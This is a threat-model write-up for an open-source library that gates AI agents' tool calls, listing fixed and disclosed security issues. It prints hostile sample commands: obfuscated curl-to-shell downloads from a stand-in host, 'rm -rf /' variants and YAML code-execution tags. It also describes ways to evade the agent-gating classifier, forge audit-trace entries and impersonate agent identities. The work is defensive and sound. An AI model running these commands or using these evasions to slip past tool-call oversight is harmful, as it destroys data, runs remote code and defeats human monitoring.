# Security model

This document is the output of a threat-modeling pass over `packages/toolgovern/src/` and
`packages/toolgovern-cli/src/`, done with an OWASP-Top-10 / STRIDE mindset specific to what this
library actually does: classify a tool call's arguments and gate it before it executes. It covers
what was found, what was fixed (with the regression test that proves it), and what is disclosed as
a known v0.1 limitation instead of silently shipped.

Every finding below was reproduced with a real script or test before being called a finding.
"Plausible but unverified" ideas are not listed here.

## Fixed

### 1. Argument obfuscation could bypass the shell-risk classifier (TG01)

**The gap.** The TG01 rules (`rm -rf`, pipe-to-shell, `sudo`, etc.) matched literal
substrings/regexes against the raw command text. Four obfuscation techniques bypassed this
undetected, confirmed with a standalone script before any fix:

- **Base64-decode-then-execute**, no literal `curl`/`wget` token present:
  `echo Y3VybCBodHRwOi8vZXZpbC5pby9wYXlsb2FkIHwgc2g= | base64 -d | sh`
- **Empty-quote-pair splitting** (`''`/`""` contribute nothing to what a POSIX shell runs, but
  break a literal match): `cu''rl https://evil.io/payload | sh`, `r""m -rf /`
- **Invisible Unicode characters** (zero-width space, etc.) spliced into a token to break a
  `\b(curl|wget)\b`-style word-boundary match: `cu<ZWSP>rl https://evil.io/payload | sh`
- **`$IFS` as a stand-in for a literal space** (a standard shell-filter-bypass technique):
  `rm${IFS}-rf${IFS}/`

**The fix.**

- `packages/toolgovern/src/classifier/util.ts` adds `normalizeForMatch()`: Unicode NFKC
  normalization, stripping of zero-width/bidi-control/invisible-format characters, `$IFS`/`${IFS}`
  collapsed to a space, adjacent empty-quote pairs collapsed (repeatedly, so `r""""m` is fully
  resolved), and a backslash immediately before a plain letter/digit removed (`c\url` -> `curl`).
  This does not change what gets executed -- it only closes the gap between what the shell will
  run and what the regex sees. Applied in `shell-risk.ts` (`commandText()`), `credential-access.ts`
  (`pathOrCommandText()`, `keychainAccess`, `bulkEnvDump`), and `util.ts`'s
  `extractCandidateHost()` (used by the TG03 network-egress rules).
- A new rule, `TG01-decoded-payload-execution`, catches the base64/hex/openssl-decode-then-execute
  shape directly: it fires when the command contains a recognized decode step (`base64 -d`,
  `base64 --decode`, `openssl enc -d`, `xxd -r`, `certutil -decode`, a Python `b64decode` call) _and_
  the same command feeds a shell/interpreter (a trailing `| sh`/`| bash`/etc., a `$()` substitution,
  backticks, `eval`/`exec`, or `sh -c`/`bash -c`). A plain decode with no execution context next to
  it (`base64 -d payload.b64 > payload.bin`) does not fire.

**Proof.** `packages/toolgovern/test/classifier/shell-risk.test.ts` (`argument obfuscation
resistance` and `TG01-decoded-payload-execution` describe blocks) and
`packages/toolgovern/test/classifier/credential-access.test.ts` (`argument obfuscation
resistance`) exercise every technique above against the actual rule and assert it now fires.

**What this does not cover.** This is a per-call regex classifier, not a shell-grammar parser or
an AST-based static analyzer. It closes the specific, concretely-demonstrated obfuscation classes
above. It does **not** attempt full POSIX-shell tokenization, so more exotic constructions --
brace expansion (`{c,}url`), indirect variable expansion (`${!x}`), arguments assembled from
several _different_ argument-object keys that a specific framework's tool executor concatenates
after toolgovern has already evaluated them, or a decode utility outside the list above -- can
still evade detection. A platform-security team that needs guaranteed coverage against a
determined adversary should treat this classifier as one layer, not the only layer (the same
caveat that applies to any regex/heuristic-based WAF or EDR rule).

### 2. Polynomial-time ReDoS in the `rm -rf` rule

**The gap.** `TG01-rm-rf`'s original pattern was
`/\brm\s+(-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*f[a-z]*)\b\s*(\S*)/i` -- two `[a-z]*` groups
separated only by required single letters, in an alternation with the same groups reordered. That
shape gives the regex engine many equivalent ways to partition a long run of non-matching flag
characters, which is a classic polynomial (not necessarily catastrophic-exponential, but still
severe) ReDoS shape. Measured directly:

| Adversarial input (`"rm -" + "f".repeat(n)`, no terminating `r`) | Time (old pattern) |
| ---------------------------------------------------------------- | ------------------ |
| n = 1,000                                                        | 0.99ms             |
| n = 5,000                                                        | 13.75ms            |
| n = 20,000                                                       | 334.87ms           |
| n = 50,000                                                       | 2,508ms            |
| n = 80,000                                                       | 6,020ms            |

Because `governTool()` runs the classifier synchronously, inline, on every tool call (that is the
whole design -- no network round-trip), a single long argument string blocks the host process for
seconds. This is a real availability risk: an agent argument containing a long run of `f`
characters (plausible in a large embedded blob, not even necessarily adversarial) would stall
every other tool call in the same process.

**The fix.** Replaced the ambiguous alternation with a bounded, unambiguous token pattern:
`/\brm\s+((?:-[a-z-]{1,16}\s+)*-[a-z-]{1,16})(?:\s+(\S+))?/i`, then checks in plain JavaScript
(`.includes('f')`, `.includes('r')`, both immune to backtracking) whether the captured flag
cluster contains both letters. Each token is bounded to 16 characters and there is exactly one way
to partition a matching string across the groups, which removes the ambiguity the backtracking
blowup depended on. As a side effect this also now recognizes multi-token flags (`rm -r -f /`,
not just `rm -rf /`), which the original single-token pattern did not.

**Proof.** `packages/toolgovern/test/classifier/shell-risk.test.ts` (`TG01-rm-rf ReDoS
resistance`) runs the exact 80,000-character adversarial payload from the table above and asserts
evaluation stays under 200ms; measured in practice at ~2.5ms. All prior `TG01-rm-rf` true/false
positive tests still pass unchanged.

The other TG01-TG05 regexes (pipe-to-shell, sudo, chmod-777, fork-bomb, reverse-shell, disk-wipe,
credential/network patterns) were stress-tested the same way -- long runs of non-matching
characters, and payloads shaped like each pattern's own repeated tokens -- and none showed the
same blowup; they use simple, unambiguous, linear-scan patterns.

### 3. A throwing approval handler skipped the trace and leaked a raw error

**The gap.** `governTool()`'s `require-approval` path called the caller-supplied
`onApprovalRequired` handler and awaited the result. If that handler threw (synchronously or via a
rejected promise), the exception propagated out of `resolveApproval()` and out of `execute()`
_before_ the `trace.append()` call and before `onDecision()` fired. Two problems: the underlying
tool never ran (so it was not unsafe), but (a) the caller saw a raw, unrelated `Error` instead of
the library's own `ToolGovernDenialError`, and (b) **no trace entry was written for that call at
all** -- a silent gap in the audit trail. That directly violates this project's own rule that
"every gate decision must be explainable from the trace alone" (`CLAUDE.md`).

Reproduced with a standalone test before fixing: a handler that threw `Error('handler blew up')`
surfaced that exact error, not `ToolGovernDenialError`.

**The fix.** `resolveApproval()` in `packages/toolgovern/src/middleware/onToolCall.ts` now treats
a throwing/rejecting handler exactly like "no handler" or "timed out": `.catch(() => false)`, so
it resolves to a denial instead of propagating. This restores both invariants -- fail-closed _and_
always-traced.

**Proof.**
`packages/toolgovern/test/middleware/onToolCall.test.ts` adds three tests: a synchronously-throwing
handler and a rejecting-promise handler both now reject with `ToolGovernDenialError`, and a
dedicated test confirms the trace entry for that call still gets written (asserting the classifier
decision and fired rule ID appear in the trace file) where before the fix no entry existed at all.

## Reviewed, and hardened where a real fix was possible

### 4. Trace tamper-evidence (`--verify-chain`)

**What was already true and already disclosed.** The trace's default `signature` is a `sha256:`
content hash, not a keyed signature -- `docs/trace-format.md` already stated plainly that this
proves an entry has not changed since it was written, but does not stop "an attacker who has full
write access to the trace file recomputing every subsequent hash after tampering." A test already
existed (`detects a tampered signature`) proving the _naive_ case is caught: if you hand-edit a
field and leave the old signature in place, `verifyChain()` flags the mismatch.

**What we verified and made explicit.** The deeper, previously-undemonstrated case: an attacker
who edits an entry _and_ recomputes its `sha256:` signature (trivial, since the hash needs no
secret) produces a trace that still passes `verifyChain()`. This is now proven directly by a test
(`packages/toolgovern/test/trace/trace-reader.test.ts`, "documents the residual limitation of the
unkeyed sha256 scheme") rather than only asserted in prose, so the limitation cannot silently
regress into an unproven claim.

**The improvement shipped.** `TraceWriter` now accepts an optional `secretKey` (`TraceWriterOptions`).
When set, entries are signed `hmac-sha256:<hex>` instead of `sha256:<hex>`. `verifyChain()` accepts
a matching `secretKey` and:

- verifies an `hmac-sha256:` entry correctly when given the right key,
- **reports an issue** (not a silent pass) if an `hmac-sha256:` entry is presented with no key or
  the wrong key,
- keeps verifying legacy/default `sha256:` entries exactly as before, per-entry, regardless of
  whether the caller happens to also supply a `secretKey`.

That last point was a real bug caught during the manual end-to-end QA pass (Section 5 of the
build checklist), not something caught by a unit test first: `verifyChain()` initially applied
whatever `secretKey` it was given to _every_ entry regardless of that entry's own signature
scheme, so running `toolgovern-cli audit --verify-chain --key-file <path>` against a perfectly
valid, untampered, unkeyed (`sha256:`) trace reported every single entry as `CHAIN INVALID` --
the key was being used to recompute a signature for entries that were never signed with a key at
all. Fixed by only applying `secretKey` to entries whose own scheme is `hmac-sha256`; a `sha256:`
entry is always recomputed unkeyed. Regression tests added at both layers:
`packages/toolgovern/test/trace/trace-reader.test.ts` ("verifies a chain written WITHOUT a key
even when the caller supplies a secretKey anyway") and
`packages/toolgovern-cli/test/cli.test.ts` ("verifies an unkeyed (sha256) trace fine even when
--key-file is passed anyway").

`toolgovern-cli audit --verify-chain` gained a `--key-file <path>` flag that reads a raw key file
and passes it through.

Proof: `packages/toolgovern/test/trace/trace-reader.test.ts` (`hmac-sha256 keyed signing`) covers
round-trip verification, missing-key detection, a forged-entry-with-wrong-key rejection, and the
mixed-scheme regression above. `packages/toolgovern-cli/test/cli.test.ts` covers the `--key-file`
flag end to end, including a clear error when the key file itself does not exist.

**Residual limitation, disclosed rather than hidden.** Keyed signing raises the bar -- an attacker
without the key cannot forge a valid entry -- but it is not a complete solution. toolgovern does
not generate, store, rotate, or protect this key; that is entirely the operator's responsibility.
An attacker who can read _both_ the trace file and the key file (most realistically: the same OS
user account the governed agent process runs as) can still edit an entry and produce a
signature that verifies. Real protection against that threat model requires either an external,
write-once anchor (the trace shipped to a remote, append-only sink outside the local attacker's
reach) or a proper key-management service (HSM, cloud KMS, OS keychain with process-level ACLs)
-- both are out of scope for a v0.1, self-hosted, no-server-dependency local trace file, and are
explicitly proprietary/hosted-layer territory per the project's own OSS/proprietary split, not
something silently promised by the OSS core.

### 5. YAML policy loading (`loadPolicy`, `toolgovern-cli validate`)

**Reviewed, confirmed safe, no change needed.** Both `packages/toolgovern/src/policy/loadPolicy.ts`
and `packages/toolgovern-cli/src/cli.ts` parse policy files with the `yaml` package (eemeli/yaml,
not `js-yaml`) using its default `parse()` call -- no custom schema, no unsafe/`FAILSAFE_SCHEMA`
opt-out. This is a materially different library and API from the historically-unsafe
`js-yaml.load()` path. Verified directly:

```
a: !!js/function "function (){return 1}"        -> parsed as the plain string "function (){return 1}"
a: !!python/object/apply:os.system ["echo pwned"] -> parsed as {"a": ["echo pwned"]}, os.system never invoked
a: !!js/undefined ~                              -> parsed as the plain string "~"
```

Unrecognized tags are left as unresolved plain scalars (with a warning), never deserialized into
executable objects. There is no code-execution path here. No fix required.

### 6. Path handling in the CLI (`validate <policy-file>`, `audit <trace-file>`)

**Reviewed, not applicable as a vulnerability.** "Path traversal" is a vulnerability when an
application accepts partial, attacker-controlled input and appends it to a trusted base directory
across a privilege boundary (e.g., a server resolving `baseDir + userInput`). `toolgovern-cli` has
no such boundary: `validate` and `audit` take a full file path directly from the invoking user's
own shell, exactly the same trust model as `cat` or `less`. There is no intermediate trust boundary
for a path argument to escape -- the CLI process already runs with the invoking user's own
filesystem permissions. No fix applied; documented here so this was a considered "not applicable"
rather than an unreviewed gap.

### 7. Filesystem-scope path matching (TG02) is prefix-string comparison, not canonicalization

**Reviewed, disclosed as a known limitation, no fix applied in v0.1.** `isPathWithin()`
(`packages/toolgovern/src/shared/paths.ts`) normalizes `./`, duplicate slashes, and trailing
slashes, and separately `TG02-path-traversal` rejects any path containing a literal `..` segment.
It does **not** resolve symlinks or call anything like `fs.realpath()` -- toolgovern's classifier
never touches the filesystem itself; it evaluates the argument string the calling framework hands
it. A path that resolves differently once the real tool executor follows a symlink, or that uses
an encoding the calling framework itself decodes before actually touching disk (e.g. a framework
that unescapes `%2e%2e` before calling its filesystem tool), is outside what a stateless,
filesystem-free classifier can see. This is the same category of limitation TG06/TG07
(session-level, cross-call context) are meant to eventually help with, not a v0.1 defect.

### 8. Cross-agent scope inheritance (TG05) and default-deny intersection

**Reviewed, no issues found.** Walked `computeInheritedScope()` and `ScopeRegistry` in
`packages/toolgovern/src/scoping/inheritance-enforcer.ts`: a sub-agent's granted scope is always
the intersection of what it requests and what its coordinator currently has (never a union, never
an implicit default-allow), an unregistered coordinator yields the empty scope rather than
unrestricted access, and TG05's rules re-check every call against the registry (not just at spawn
time), including the case where a coordinator's own scope has since shrunk. The existing test
suite (`inheritance-enforcer.test.ts`, `cross-agent-inheritance.test.ts`) already covers this with
both true- and false-positive cases; no gap was found that warranted a new rule or a fix here.

### 9. Agent identity is caller-asserted, not cryptographically verified

**The gap, and what is (and is not) fixed here.** `RuleContext.agentId` and `Policy.agentId`
(`packages/toolgovern/src/types.ts`) are plain strings. Nothing in `governTool()`
(`packages/toolgovern/src/middleware/onToolCall.ts`) or the scoping registry
(`packages/toolgovern/src/scoping/`) cryptographically verifies that a caller supplying a given
`agentId` actually is that agent. Any caller that can invoke `governTool()` can claim any
`agentId` string, get evaluated against that agent's granted scope, and have decisions recorded
under that identity in the trace. **This is not fixed in this pass, and is not claimed to be
fixed.** Full identity verification -- signed caller tokens, mTLS client certs, a trusted broker
that mints and attests `agentId`s -- is a real feature with real design tradeoffs (key
management, revocation, how a "coordinator" and its "sub-agents" would each get and rotate
credentials) that belongs in its own pass, not bolted onto this one.

**What this pass does instead: a scoped, honest partial improvement.**

- **Format validation.** `isValidAgentId()` (`packages/toolgovern/src/scoping/scope-declaration.ts`)
  rejects `agentId` values that are empty, longer than 256 characters, or contain ASCII control
  characters / the Unicode line-and-paragraph-separator characters (U+0000-U+001F, U+007F,
  U+2028, U+2029). `governTool()` calls it on any explicitly-supplied `options.agentId` and
  throws `InvalidAgentIdError` synchronously (at wrap time, before any tool call is evaluated or
  traced) if it fails. This catches a concrete, narrow class of malformed/malicious input --
  empty-string identity, unbounded-length payloads, embedded null bytes or newlines that could be
  used for log injection or to forge what looks like an extra trace line -- that should never be
  treated as an identity at all, independent of whether identity is ever verified. It does **not**
  verify that a well-formed string is true; a well-formed lie passes exactly as easily as it did
  before.
- **Identity-source provenance.** `governTool()` now records whether the `agentId` used for a
  call was `'explicit'` (the caller passed `options.agentId`) or `'fallback'` (no `agentId` was
  supplied, so toolgovern used `'default-agent'`), as a new optional `agentIdSource` /
  `agent_id_source` field on `TraceEntryInput` / `TraceEntry`
  (`packages/toolgovern/src/types.ts`) and the corresponding trace line
  (`docs/trace-format.md`). This gives an auditor reading the trace after the fact one more
  signal: a run of decisions all recorded under `'fallback'` means no caller ever asserted a
  distinct identity for that agent, which is useful context when investigating an incident, even
  though `'explicit'` still does not mean the asserted identity was verified.

**What this explicitly does NOT do**, stated plainly so it is not mistaken for more than it is:

- It does not prove a caller is who it claims to be.
- It does not stop a malicious caller from asserting another agent's exact `agentId` string
  (impersonation), as long as that string happens to be well-formed.
- It does not add any authentication, signing, or token-issuance mechanism.
- `agent_id_source: "explicit"` is not an attestation -- it only means _some_ caller supplied
  _some_ well-formed string, not that the string is accurate.

**Proof.** `packages/toolgovern/test/scoping/scope-declaration.test.ts` (`isValidAgentId`) covers
the accepted/rejected format cases (empty string, over-length string, embedded null byte,
embedded newline, control characters, non-string input, and realistic well-formed identities like
UUIDs and namespaced strings). `packages/toolgovern/test/middleware/onToolCall.test.ts`
(`agent identity format validation` and `agent identity source` describe blocks) cover
`governTool()` throwing `InvalidAgentIdError` for a malformed explicit `agentId`, and the trace
correctly recording `agent_id_source: 'explicit'` vs. `'fallback'` for the corresponding call
paths, alongside confirmation that existing valid-identity flows (a normal explicit `agentId`, and
the no-`agentId`-supplied default path) are unaffected.

## Summary

| #   | Area                                                                           | Status                                                                                                               |
| --- | ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------- |
| 1   | TG01 argument obfuscation (base64, quote-splitting, invisible Unicode, `$IFS`) | Fixed + tested                                                                                                       |
| 2   | ReDoS in `TG01-rm-rf`                                                          | Fixed + tested                                                                                                       |
| 3   | Approval handler exception skips trace / leaks raw error                       | Fixed + tested                                                                                                       |
| 4   | Trace tamper-evidence (unkeyed default vs. attacker who recomputes the hash)   | Documented limitation (pre-existing) + proven with a test + optional HMAC-keyed signing shipped as a real mitigation |
| 5   | YAML policy-loader RCE risk                                                    | Reviewed, confirmed safe, no change needed                                                                           |
| 6   | CLI path-argument traversal                                                    | Reviewed, not applicable, no change needed                                                                           |
| 7   | Filesystem-scope path canonicalization                                         | Documented known limitation, no fix in v0.1                                                                          |
| 8   | Cross-agent scope inheritance soundness                                        | Reviewed, no issues found                                                                                            |
| 9   | Agent identity is caller-asserted, not cryptographically verified              | Partial fix + tested (format validation + trace provenance); identity verification remains out of scope             |

Nothing in this document should be read as "toolgovern makes a gated agent session safe." A gated
call means it was evaluated against the current rule set and, for the classes of bypass covered
above, the classifier now resists the specific obfuscation techniques that were checked and
confirmed. It is not a guarantee against every possible bypass, and it is not a claim that TG06/TG07
(session-level anomaly detection, not yet built) would have caught a multi-step attack that only
looks suspicious in aggregate.
